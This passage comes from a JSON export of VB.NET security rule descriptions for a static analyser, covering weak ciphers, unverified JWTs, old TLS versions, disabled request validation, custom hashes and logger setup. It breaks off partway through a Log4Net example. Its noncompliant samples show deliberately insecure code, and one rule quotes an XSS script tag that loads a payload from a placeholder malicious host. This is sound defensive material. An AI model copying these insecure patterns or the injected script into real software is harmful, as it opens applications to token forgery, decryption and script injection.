avoided.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nImports System.Security.Cryptography\n\nPublic Sub Encrypt()\n    Dim SimpleDES As New DESCryptoServiceProvider() ' Noncompliant\nEnd Sub\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nImports System.Security.Cryptography\n\nPublic Sub Encrypt()\n    Dim AES128ECB = Aes.Create()\nEnd Sub\n</pre>\n<h3>How does this work?</h3>\n<h4>Use a secure algorithm</h4>\n<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an\nalgorithm is the Advanced Encryption Standard (AES).</p>\n<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "vbnet:S5659": {
        "name": "JWT should be signed and verified with strong cipher algorithms",
        "htmlDesc": "<p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>\n<h2>Why is this an issue?</h2>\n<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security\nrisk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This\nvulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT\nhinges on the strength and presence of its signature.</p>\n<h3>What is the potential impact?</h3>\n<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant\nthreat to data security and the privacy of user identities.</p>\n<h4>Impersonation of users</h4>\n<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.\nWhen these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to\ncraft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level\npermissions and sensitive data.</p>\n<h4>Unauthorized data access</h4>\n<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker\ncan manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>\n<h2>How to fix it in Jwt.Net</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of JWT encoding and decoding without a strong cipher algorithm.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nImports JWT\n\nPublic Sub Decode(decoder AS IJwtDecoder)\n    Dim decoded As String = decoder.Decode(token, secret, verify:= false) ' Noncompliant\nEnd Sub\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nImports JWT\n\nPublic Sub Decode()\n    Dim decoded As String = new JwtBuilder()\n        .WithSecret(secret)\n        .Decode(token) ' Noncompliant\nEnd Sub\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nImports JWT\n\nPublic Sub Decode(decoder AS IJwtDecoder)\n    Dim decoded As String = decoder.Decode(token, secret, verify:= true)\nEnd Sub\n</pre>\n<p>When using <code>JwtBuilder</code>, make sure to call <code>MustVerifySignature()</code>.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nImports JWT\n\nPublic Sub Decode()\n    Dim decoded As String = new JwtBuilder()\n        .WithSecret(secret)\n        .MustVerifySignature()\n        .Decode(token)\nEnd Sub\n</pre>\n<h3>How does this work?</h3>\n<h4>Verify the signature of your tokens</h4>\n<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:\nvalidating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating\nsignatures, they are not serving their purpose.</p>\n<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding\nprocess that the signature of the JWT should also be checked.</p>\n<p>To resolve the issue, follow these instructions:</p>\n<ol>\n  <li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not\n  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li>\n  <li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating\n  potential tampering. The action to take when encountering an invalid token should be denying the request carrying it and logging the event for\n  further investigation. </li>\n  <li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature\n  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li>\n</ol>\n<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on\ntampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>\n<h3>Going the extra mile</h3>\n<h4>Securely store your secret keys</h4>\n<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control\nsystem. Instead, consider using environment variables, secure key management systems, or vault services.</p>\n<h4>Rotate your secret keys</h4>\n<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to\nperiodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be\nsure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/347\">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "vbnet:S4423": {
        "name": "Weak SSL/TLS protocols should not be used",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are\nall considered weak by the cryptographic community, and are officially deprecated:</p>\n<ul>\n  <li> SSL versions 1.0, 2.0 and 3.0 </li>\n  <li> TLS versions 1.0 and 1.1 </li>\n</ul>\n<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform\nmathematical attacks on this data after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>These samples use a default TLS algorithm, which is a weak cryptographical algorithm: TLSv1.0.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nImports System.Net\nImports System.Security.Authentication\n\nPublic Sub Encrypt()\n    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls ' Noncompliant\nEnd Sub\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nImports System.Net.Http\nImports System.Security.Authentication\n\nPublic Sub Encrypt()\n    Dim Handler As New HttpClientHandler With {\n        .SslProtocols = SslProtocols.Tls ' Noncompliant\n    }\nEnd Sub\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nImports System.Net\nImports System.Security.Authentication\n\nPublic Sub Encrypt()\n    ServicePointManager.SecurityProtocol = _\n        SecurityProtocolType.Tls12 _\n        Or SecurityProtocolType.Tls13\nEnd Sub\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nImports System.Net.Http\nImports System.Security.Authentication\n\nPublic Sub Encrypt()\n    Dim Handler As New HttpClientHandler With {\n        .SslProtocols = SslProtocols.Tls12\n    }\nEnd Sub\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "vbnet:S5753": {
        "name": "Disabling ASP.NET \"Request Validation\" feature is security-sensitive",
        "htmlDesc": "<p>ASP.NET 1.1+ comes with a feature called <em>Request Validation</em>, preventing the server to accept content containing un-encoded HTML. This\nfeature comes as a first protection layer against Cross-Site Scripting (XSS) attacks and act as a simple Web Application Firewall (WAF) rejecting\nrequests potentially containing malicious content.</p>\n<p>While this feature is not a silver bullet to prevent all XSS attacks, it helps to catch basic ones. It will for example prevent <code>&lt;script\ntype=\"text/javascript\" src=\"https://malicious.domain/payload.js\"&gt;</code> to reach your Controller.</p>\n<p>Note: <em>Request Validation</em> feature being only available for ASP.NET, no Security Hotspot is raised on ASP.NET Core applications.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the developer doesn’t know the impact to deactivate the Request Validation feature </li>\n  <li> the web application accepts user-supplied data </li>\n  <li> all user-supplied data are not validated </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Activate the Request Validation feature for all HTTP requests </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>At Controller level:</p>\n<pre>\n&lt;ValidateInput(False)&gt;\nPublic Function Welcome(Name As String) As ActionResult\n  ...\nEnd Function\n</pre>\n<p>At application level, configured in the Web.config file:</p>\n<pre>\n&lt;configuration&gt;\n   &lt;system.web&gt;\n      &lt;pages validateRequest=\"false\" /&gt;\n      ...\n      &lt;httpRuntime requestValidationMode=\"0.0\" /&gt;\n   &lt;/system.web&gt;\n&lt;/configuration&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<p>At Controller level:</p>\n<pre>\n&lt;ValidateInput(True)&gt;\nPublic Function Welcome(Name As String) As ActionResult\n  ...\nEnd Function\n</pre>\n<p>or</p>\n<pre>\nPublic Function Welcome(Name As String) As ActionResult\n  ...\nEnd Function\n</pre>\n<p>At application level, configured in the Web.config file:</p>\n<pre>\n&lt;configuration&gt;\n   &lt;system.web&gt;\n      &lt;pages validateRequest=\"true\" /&gt;\n      ...\n      &lt;httpRuntime requestValidationMode=\"4.5\" /&gt;\n   &lt;/system.web&gt;\n&lt;/configuration&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> <a\n  href=\"https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.httpruntimesection.requestvalidationmode?view=netframework-4.8\">HttpRuntimeSection.RequestValidationMode Property</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/ASP-NET_Request_Validation\">OWASP ASP.NET Request Validation</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\">OWASP Cheat Sheet</a> - XSS\n  Prevention Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "vbnet:S2257": {
        "name": "Using non-standard cryptographic algorithms is security-sensitive",
        "htmlDesc": "<p>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has\nbeen protected. Standard algorithms like <code>AES</code>, <code>RSA</code>, <code>SHA</code>, …​ should be used instead.</p>\n<p>This rule tracks custom implementation of these types from <code>System.Security.Cryptography</code> namespace:</p>\n<ul>\n  <li> <code>AsymmetricAlgorithm</code> </li>\n  <li> <code>AsymmetricKeyExchangeDeformatter</code> </li>\n  <li> <code>AsymmetricKeyExchangeFormatter</code> </li>\n  <li> <code>AsymmetricSignatureDeformatter</code> </li>\n  <li> <code>AsymmetricSignatureFormatter</code> </li>\n  <li> <code>DeriveBytes</code> </li>\n  <li> <code>HashAlgorithm</code> </li>\n  <li> <code>ICryptoTransform</code> </li>\n  <li> <code>SymmetricAlgorithm</code> </li>\n</ul>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a standard algorithm instead of creating a custom one. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nPublic Class CustomHash     ' Noncompliant\n    Inherits HashAlgorithm\n\n    Private fResult() As Byte\n\n    Public Overrides Sub Initialize()\n        fResult = Nothing\n    End Sub\n\n    Protected Overrides Function HashFinal() As Byte()\n        Return fResult\n    End Function\n\n    Protected Overrides Sub HashCore(array() As Byte, ibStart As Integer, cbSize As Integer)\n        fResult = If(fResult, array.Take(8).ToArray)\n    End Sub\n\nEnd Class\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nDim mySHA256 As SHA256 = SHA256.Create()\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#CUSTOM_MESSAGE_DIGEST\">MessageDigest is Custom</a>\n  </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "vbnet:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little\ncomputational effort is enough to find two or more different inputs that produce the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nImports System.Security.Cryptography\n\nSub ComputeHash()\n\n    ' Review all instantiations of classes that inherit from HashAlgorithm, for example:\n    Dim hashAlgo As HashAlgorithm = HashAlgorithm.Create() ' Sensitive\n    Dim hashAlgo2 As HashAlgorithm = HashAlgorithm.Create(\"SHA1\") ' Sensitive\n    Dim sha As SHA1 = New SHA1CryptoServiceProvider() ' Sensitive\n    Dim md5 As MD5 = New MD5CryptoServiceProvider() ' Sensitive\n\n    ' ...\nEnd Sub\n\nClass MyHashAlgorithm\n    Inherits HashAlgorithm ' Sensitive\n\n    ' ...\nEnd Class\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nImports System.Security.Cryptography\n\nSub ComputeHash()\n    Dim sha256 = New SHA256CryptoServiceProvider() ' Compliant\n    Dim sha384 = New SHA384CryptoServiceProvider() ' Compliant\n    Dim sha512 = New SHA512CryptoServiceProvider() ' Compliant\n\n    ' ...\nEnd Sub\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1240\">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "vbnet:S4792": {
        "name": "Configuring loggers is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285\">CVE-2018-0285</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127\">CVE-2000-1127</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113\">CVE-2017-15113</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742\">CVE-2015-5742</a> </li>\n</ul>\n<p>Logs are useful before, during and after a security incident.</p>\n<ul>\n  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it\n  is the first step to prevent an attack from ever happening. </li>\n  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>\n</ul>\n<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information\nlogged and how they are logged.</p>\n<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives\n  access to them. </li>\n  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>\n  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the\n  user can perform the action as many times as he/she wants. </li>\n  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)\n  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>\n  <li> the logs are only stored locally instead of being backuped or replicated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Check that your production deployment doesn’t have its loggers in \"debug\" mode as it might write sensitive information in logs. </li>\n  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>\n  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the\n  hostname. </li>\n  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the\n  impact is known and limited. </li>\n  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the\n  service are secure too. </li>\n  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control\n  the logged information. An attacker could just repeat a logged action many times. </li>\n</ul>\n<p>Remember that configuring loggers properly doesn’t make them bullet-proof. Here is a list of recommendations explaining on how to use your\nlogs:</p>\n<ul>\n  <li> Don’t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user\n  names, locations, etc…​ Usually any information which is protected by law is good candidate for removal. </li>\n  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc…​ As for any user\n  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example\n  use all your storage space or compromise your log indexing service. </li>\n  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as\n  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>\n  <li> Monitor the logs for any suspicious activity. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><strong>.Net Core</strong>: configure programmatically</p>\n<pre>\nImports System\nImports System.Collections\nImports System.Collections.Generic\nImports Microsoft.AspNetCore\nImports Microsoft.AspNetCore.Builder\nImports Microsoft.AspNetCore.Hosting\nImports Microsoft.Extensions.Configuration\nImports Microsoft.Extensions.DependencyInjection\nImports Microsoft.Extensions.Logging\nImports Microsoft.Extensions.Options\n\nNamespace MvcApp\n\n    Public Class ProgramLogging\n\n        Public Shared Function CreateWebHostBuilder(args As String()) As IWebHostBuilder\n\n            WebHost.CreateDefaultBuilder(args) _\n                .ConfigureLogging(Function(hostingContext, Logging) ' Sensitive\n                                      ' ...\n                                  End Function) _\n            .UseStartup(Of StartupLogging)()\n\n            '...\n        End Function\n    End Class\n\n\n    Public Class StartupLogging\n\n        Public Sub ConfigureServices(services As IServiceCollection)\n\n            services.AddLogging(Function(logging) ' Sensitive\n                                    '...\n                                End Function)\n        End Sub\n\n        Public Sub Configure(app As IApplicationBuilder, env As IHostingEnvironment, loggerFactory As ILoggerFactory)\n\n            Dim config As IConfiguration = Nothing\n            Dim level As LogLevel = LogLevel.Critical\n            Dim includeScopes As Boolean = False\n            Dim filter As Func(Of String, Microsoft.Extensions.Logging.LogLevel, Boolean) = Nothing\n            Dim consoleSettings As Microsoft.Extensions.Logging.Console.IConsoleLoggerSettings = Nothing\n            Dim azureSettings As Microsoft.Extensions.Logging.AzureAppServices.AzureAppServicesDiagnosticsSettings = Nothing\n            Dim eventLogSettings As Microsoft.Extensions.Logging.EventLog.EventLogSettings = Nothing\n\n            ' An issue will be raised for each call to an ILoggerFactory extension methods adding loggers.\n            loggerFactory.AddAzureWebAppDiagnostics() ' Sensitive\n            loggerFactory.AddAzureWebAppDiagnostics(azureSettings) ' Sensitive\n            loggerFactory.AddConsole() ' Sensitive\n            loggerFactory.AddConsole(level) ' Sensitive\n            loggerFactory.AddConsole(level, includeScopes) ' Sensitive\n            loggerFactory.AddConsole(filter) ' Sensitive\n            loggerFactory.AddConsole(filter, includeScopes) ' Sensitive\n            loggerFactory.AddConsole(config) ' Sensitive\n            loggerFactory.AddConsole(consoleSettings) ' Sensitive\n            loggerFactory.AddDebug() ' Sensitive\n            loggerFactory.AddDebug(level) ' Sensitive\n            loggerFactory.AddDebug(filter) ' Sensitive\n            loggerFactory.AddEventLog() ' Sensitive\n            loggerFactory.AddEventLog(eventLogSettings) ' Sensitive\n            loggerFactory.AddEventLog(level) ' Sensitive\n            ' Only available for NET Standard 2.0 and above\n            'loggerFactory.AddEventSourceLogger() ' Sensitive\n\n            Dim providers As IEnumerable(Of ILoggerProvider) = Nothing\n            Dim filterOptions1 As LoggerFilterOptions = Nothing\n            Dim filterOptions2 As IOptionsMonitor(Of LoggerFilterOptions) = Nothing\n\n            Dim factory As LoggerFactory = New LoggerFactory() ' Sensitive\n            factory = New LoggerFactory(providers) ' Sensitive\n            factory = New LoggerFactory(providers, filterOptions1) ' Sensitive\n            factory = New LoggerFactory(providers, filterOptions2) ' Sensitive\n        End Sub\n    End Class\nEnd Namespace\n</pre>\n<p><strong>Log4Net</strong></p>\n<pre>\nImports System\nImports System.IO\nImports System.Xml\nImports log4net.Appender\nImports log4net.Config\nImports log4net.Repository\n\nNamespace Logging\n    Class Log4netLogging\n        Private Sub Foo(ByVal repository As ILoggerRepository, ByVal element As XmlElement, ByVal configFile As FileInfo, ByVal configUri As Uri, ByVal configStream As Stream, ByVal appender As IAppender, ParamArray appenders As IAppender())\n            log4net.Config.XmlConfigurator.Configure(repository) ' Sensitive\n            log4net.Config.XmlConfigurator.Configure(repository, element) ' Sensitive\n            log4net.Config.XmlConfigurator.Configure(repository, configFile) ' Sensitive\n            log4net.Config.XmlConfigurator.Configure(repository, configUri) ' Sensitive\n            log4net.Config.XmlConfigurator.Configure(repository, configStream) ' Sensitive\n            log4net.Config.XmlConfigurator.ConfigureAndWatch(repository, configFile) ' Sensitive\n\n            log4net.Config.DOMConfigurator.Configure() ' Sensitive\n            log4net.Config.DOMConfigurator.Configure(repository) ' Sensitive\n            log4net.Config.DOMConfigurator.Configure(element) ' Sensitive\n            log4net.Config.DOMConfigurator.Configure(repository, element) ' Sensitive\n            log4net.Config.DOMConfigurator.Configure(configFile) ' Sensitive\n            log4net.Config.DOMConfigurator.Configure(repository, configFile) ' Sensitive\n            log4net.Config.DOMConfigurator.Configure(configStream) ' Sensitive\n            log4net.Config.DOMConfigurator.Configure(repository, configStream) ' Sensitive\n            log4net.Config.DOMConfigurator.ConfigureAndWatch(configFile) ' Sensitive\n            log4net.Config.DOMConfigurator.ConfigureAndWatch(repository, configFile) ' Sensitive\n\n            log4net.Config.BasicConfigurator.Configure() ' Sensitive\n            log4net.Config.BasicConfigurator.Configure(appender) ' Sensitive\n            